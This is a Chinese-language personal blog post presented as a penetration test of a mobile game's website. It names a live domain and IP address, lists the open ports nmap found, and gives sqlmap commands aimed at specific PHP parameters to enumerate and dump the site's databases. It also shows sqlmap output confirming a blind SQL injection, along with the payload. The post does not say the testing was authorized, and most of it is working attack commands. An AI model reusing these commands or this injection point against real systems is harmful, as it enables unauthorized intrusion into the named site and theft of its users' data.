<!doctype html><html><head><title>Polly Blog - AI Assistant, Tutorials, and Insights</title><meta content="Explore Polly Blog for AI tutorials, insights, and updates on cutting-edge technology." name=description><meta content="Polly, Blog, AI Blog, AI Assistant, Tutorials, Technology Blog, Baoli Wang" name=keywords><meta content="width=device-width,initial-scale=1" name=viewport><meta content="text/html; charset=utf-8" http-equiv=content-type><link href=https://cdn.jsdelivr.net/npm/purecss@3.0.0/build/pure-min.css rel=stylesheet><link href=https://cdn.jsdelivr.net/npm/purecss@3.0.0/build/grids-responsive-min.css rel=stylesheet><link href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css rel=stylesheet><link href=https://polly2014.github.io/css/style_new.css rel=stylesheet><script src="https://www.googletagmanager.com/gtag/js?id=G-8JD13N7PHS" async></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date());gtag('config','G-8JD13N7PHS')</script><body><div class=menu-toggle><img alt=Menu src=https://polly2014.github.io/images/polly.png></div><div class=overlay></div><div class="pure-g container"><div class="sidebar pure-u-1 pure-u-md-1-5"><div class=title><a class=pure-menu-heading href=https://polly2014.github.io> <img class="avatar pure-img-responsive" src=https://polly2014.github.io/images/polly.png> </a><div class=introduction><p>Polly's Blog</div><div class=nav><ul class=nav-links><li><a href=https://polly2014.github.io><i class="fas fa-home"></i>Home</a><li><a href=https://polly2014.github.io/archive><i class="fas fa-archive"></i>Archive</a><li><a href=https://polly2014.github.io/category><i class="fas fa-folder"></i>Category</a><li><a href=https://polly2014.github.io/blog><i class="fas fa-file-alt"></i>Posts</a><li><a href=https://polly2014.github.io/publication><i class="fas fa-file-pdf"></i>Research</a><li><a href=https://polly2014.github.io/changelog><i class="fas fa-history"></i>Change log</a><li><a href=https://polly2014.github.io/about><i class="fas fa-info-circle"></i>About Me</a></ul></div><div class=social><ul class=social-links><li><a href=mailto:26716201@qq.com><i class="fas fa-envelope"></i></a><li><a href=https://twitter.com/Polly__007><i class="fab fa-twitter"></i></a><li><a href=https://www.linkedin.com/in/baoliwang><i class="fab fa-linkedin-in"></i></a><li><a href=https://github.com/Polly2014><i class="fab fa-github"></i></a></ul></div></div></div><div class="content pure-u-1 pure-u-md-4-5"><div class=blog-post><h1>Droiyan手游渗透测试</h1><div class=content><h2 id=fu-wu-qi-ji-ben-xin-xi>服务器基本信息</h2><ul><li><div style=overflow-x:auto;background:#2b303b><pre class=language-sh data-lang=sh style=background:#2b303b;color:#c0c5ce><code class=language-sh data-lang=sh><span style=color:#bf616a>IP:</span><span> 43.154.160.115
</span><span style=color:#bf616a>domain:</span><span> http://gdr.xueyetang.com/
</span></code></pre></div></ul><h2 id=nmapsao-yi-bian-huo-qu-kai-fang-duan-kou-xin-xi>Nmap扫一遍，获取开放端口信息</h2><ul><li><div style=overflow-x:auto;background:#2b303b><pre class=language-sh data-lang=sh style=background:#2b303b;color:#c0c5ce><code class=language-sh data-lang=sh><span style=color:#bf616a>80 </span><span style=color:#65737e># nginx
</span><span style=color:#bf616a>81
</span><span style=color:#bf616a>443
</span><span style=color:#bf616a>3306 </span><span style=color:#65737e># mysql
</span><span style=color:#bf616a>8010
</span></code></pre></div></ul><h2 id=sqlmapkan-kan-you-mu-you-sqlzhu-ru-de-ke-neng>Sqlmap看看有木有SQL注入的可能</h2><ul><li><p>步步为营，监测除了数据库、数据表</p> <ul><li><div style=overflow-x:auto;background:#2b303b><pre class=language-sh data-lang=sh style=background:#2b303b;color:#c0c5ce><code class=language-sh data-lang=sh><span style=color:#bf616a>sqlmap -u </span><span>"</span><span style=color:#a3be8c>http://gdr.xueyetang.com/apply.php?cid=22&id=28</span><span>"</span><span style=color:#bf616a> --batch --random-agent
</span><span style=color:#bf616a>sqlmap -u </span><span>"</span><span style=color:#a3be8c>http://gdr.xueyetang.com/apply.php?cid=22&id=28</span><span>"</span><span style=color:#bf616a> --batch --random-agent --threads</span><span> 10</span><span style=color:#bf616a> --no-cast --dbs
</span><span style=color:#65737e># sqlmap -u "http://gdr.xueyetang.com/apply.php?cid=22&id=28" --batch --random-agent -D &LTdatabase> --tables
</span><span style=color:#bf616a>sqlmap -u </span><span>"</span><span style=color:#a3be8c>http://gdr.xueyetang.com/apply.php?cid=22&id=28</span><span>"</span><span style=color:#bf616a> --batch --random-agent -D</span><span> qiyou_rswl_cc</span><span style=color:#bf616a> --tables
</span><span style=color:#bf616a>sqlmap -u </span><span>"</span><span style=color:#a3be8c>http://gdr.xueyetang.com/apply.php?cid=22&id=28</span><span>"</span><span style=color:#bf616a> --batch --random-agent -D </span><span>&LTdatabase> -T &LTtable> --columns
</span><span style=color:#bf616a>sqlmap -u </span><span>"</span><span style=color:#a3be8c>http://gdr.xueyetang.com/apply.php?cid=22&id=28</span><span>"</span><span style=color:#bf616a> --batch --random-agent -D </span><span>&LTdatabase> -T &LTtable> --columns</span><span style=color:#bf616a> --dump
</span></code></pre></div><li><p><img alt=image-20231228011029929 src=https://polly2014.github.io/hack-for-droiyan/image-20231228011029929.png></p></ul><li><p>发现漏洞，开始注入</p> <ul><li><div style=overflow-x:auto;background:#2b303b><pre class=language-sh data-lang=sh style=background:#2b303b;color:#c0c5ce><code class=language-sh data-lang=sh><span style=color:#bf616a>sqlmap</span><span> identified the following injection point(s) </span><span style=color:#bf616a>with</span><span> a total of 543 HTTP(s) </span><span style=color:#bf616a>requests:
</span><span style=color:#bf616a>---
</span><span style=color:#bf616a>Parameter:</span><span> id (GET)
</span><span>    </span><span style=color:#bf616a>Type:</span><span> boolean-based blind
</span><span>    </span><span style=color:#bf616a>Title:</span><span> MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)
</span><span>    </span><span style=color:#bf616a>Payload:</span><span> cid=22&</span><span style=color:#bf616a>id</span><span>=</span><span style=color:#a3be8c>28 </span><span style=color:#bf616a>AND</span><span> MAKE_SET(8520=8520,5339)
</span><span style=color:#bf616a>---
</span><span style=color:#bf616a>[01:25:45] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> the back-end DBMS is MySQL
</span><span style=color:#bf616a>web</span><span> application technology: PHP 7.3.33
</span><span style=color:#bf616a>back-end</span><span> DBMS: MySQL Unknown (MariaDB fork)
</span><span style=color:#bf616a>[01:25:45] </span><span style=color:#b48ead>[</span><span>WARNING</span><span style=color:#b48ead>]</span><span> HTTP error codes detected during run:
</span><span style=color:#bf616a>502</span><span> (Bad Gateway) </span><span style=color:#bf616a>-</span><span> 5 times
</span><span style=color:#bf616a>[01:25:45] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> fetched data logged to text files under '</span><span style=color:#a3be8c>/Users/polly/.local/share/sqlmap/output/gdr.xueyetang.com</span><span>'
</span><span style=color:#bf616a>[01:25:45] </span><span style=color:#b48ead>[</span><span>WARNING</span><span style=color:#b48ead>]</span><span> your sqlmap version is outdated
</span></code></pre></div><li><p><img alt=image-20231228013128356 src=https://polly2014.github.io/hack-for-droiyan/image-20231228013128356.png></p></ul></ul><h2 id=zhan-guo-fen-xi>战果分析</h2><ul><li>SQL注入点及数据库类型 <ul><li><div style=overflow-x:auto;background:#2b303b><pre class=language-sh data-lang=sh style=background:#2b303b;color:#c0c5ce><code class=language-sh data-lang=sh><span style=color:#bf616a>http://gdr.xueyetang.com/install/templates/js/forms.js
</span><span style=color:#bf616a>https://github.com/gaozhifeng/PHPMyWind
</span></code></pre></div><li><div style=overflow-x:auto;background:#2b303b><pre class=language-sh data-lang=sh style=background:#2b303b;color:#c0c5ce><code class=language-sh data-lang=sh><span style=color:#bf616a>python</span><span> sqlmap.py</span><span style=color:#bf616a> -u </span><span>"</span><span style=color:#a3be8c>http://gdr.xueyetang.com/newsd.php?cid=5&id=46</span><span>"</span><span style=color:#bf616a> --batch --random-agent --threads</span><span> 10</span><span style=color:#bf616a> -f --no-cast
</span></code></pre></div></ul></ul></div><div class=navigation></div></div><div id=giscus-container><h2>留言与讨论</h2><div class=giscus></div></div><script data-category="Blog Comments" async crossorigin data-category-id=DIC_kwDOL45duM4CnjlZ data-emit-metadata=0 data-input-position=bottom data-lang=en data-mapping=pathname data-reactions-enabled=1 data-repo=Polly2014/polly2014.github.io data-repo-id=R_kgDOL45duA data-strict=0 data-theme=noborder_light src=https://giscus.app/client.js></script></div></div><script>document.addEventListener('DOMContentLoaded',function(){const c=document.querySelector('.menu-toggle');const d=document.querySelector('.sidebar');const e=document.querySelector('.overlay');function a(){d.classList.toggle('active');e.classList.toggle('active')}c.addEventListener('click',a);e.addEventListener('click',a);let f=0;let g=0;document.addEventListener('touchstart',h=>{f=h.changedTouches[0].screenX},false);document.addEventListener('touchend',h=>{g=h.changedTouches[0].screenX;b()},false);function b(){const h=g- f;if(h>50&&f<30){d.classList.add('active');e.classList.add('active')}else if(h<-50&&d.classList.contains('active')){d.classList.remove('active');e.classList.remove('active')}}})</script>